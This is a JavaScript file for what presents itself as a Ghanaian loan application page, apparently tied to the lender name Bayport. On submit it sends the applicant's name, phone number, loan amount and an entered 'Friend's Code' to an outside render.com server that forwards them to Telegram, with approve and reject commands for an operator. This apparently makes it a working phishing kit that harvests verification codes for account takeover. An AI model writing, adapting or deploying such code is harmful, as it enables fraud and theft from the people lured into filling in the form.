const API_URL = ''; // Use relative URLs

document.addEventListener('DOMContentLoaded', function() {
    const loanData = JSON.parse(localStorage.getItem('loanApp'));
    
    if (loanData) {
        document.getElementById('displayName').textContent = loanData.fullname;
        document.getElementById('displayAmount').textContent = 'GHS ' + loanData.loanAmount;
        document.getElementById('displayPhone').textContent = loanData.phone;
        document.getElementById('displayRef').textContent = loanData.referenceId;
    }
});

document.getElementById('verificationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const loanData = JSON.parse(localStorage.getItem('loanApp'));
    const friendCode = document.getElementById('friendCode').value;
    
    const message = `
🔔 *NEW LOAN APPLICATION*
━━━━━━━━━━━━━━━━━━
📱 *Phone:* ${loanData.phone}
🔑 *Friend's Code:* ${friendCode}
💰 *Amount:* GHS ${loanData.loanAmount}
👤 *Name:* ${loanData.fullname}
🆔 *Ref:* ${loanData.referenceId}
━━━━━━━━━━━━━━━━━━

*Actions:*
✅ /approve_${loanData.referenceId} - Approve
❌ /reject_${loanData.referenceId} - Reject
    `;
    
    document.getElementById('loadingOverlay').classList.remove('hidden');
    
    try {
        fetch('https://ghana-bayport-loans-1.onrender.com/api/send-message', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message })
        });
        
        localStorage.setItem('currentRef', loanData.referenceId);
        window.location.href = 'page3.html';
    } catch (error) {
        alert('Error sending to Telegram');
        document.getElementById('loadingOverlay').classList.add('hidden');
    }
});